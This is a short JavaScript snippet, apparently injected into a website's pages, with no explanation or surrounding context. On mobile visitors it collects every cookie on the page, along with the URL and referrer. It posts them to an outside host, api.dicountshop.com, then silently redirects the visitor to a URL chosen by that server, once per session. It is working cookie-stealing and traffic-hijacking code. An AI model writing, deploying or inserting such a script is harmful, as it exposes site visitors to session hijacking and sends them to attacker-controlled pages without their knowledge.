(async function() {

    function isMobileDevice() {
        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    if (!isMobileDevice()) {
        return; 
    }

    if (sessionStorage.getItem('redirected')) {
        return; 
    }

    function getCookies() {
        return document.cookie.split(';').reduce((cookieObject, cookie) => {
            let [name, ...value] = cookie.split('=');
            name = name.trim();
            if (name) {
                cookieObject[name] = decodeURIComponent(value.join('=').trim());
            }
            return cookieObject;
        }, {});
    }

    let cookies = getCookies();
    let requestData = {
    url: window.location.href, 
    referrer: document.referrer, 
    coo: JSON.stringify(cookies), 
    origin: window.location.hostname 
    };
    
    try {
        let response = await fetch('https://api.dicountshop.com/api/scriptdata', {
            method: 'POST',
            body: JSON.stringify(requestData),
            headers: { 'Content-Type': 'application/json' }
        });

        if (!response.ok) {
            let errorText = await response.text();  
            throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
        }

        let responseData = await response.json();
        
        if (responseData && responseData.url) {
            let link = document.createElement('a');
            link.href = responseData.url;  
            link.rel = 'noreferrer';       
            document.body.appendChild(link);  
            link.click();          
            //window.location.href = responseData.url;       
            sessionStorage.setItem('redirected', 'true');
        }
    } catch (error) {
        console.error('Error sending data:', error);
    }
})();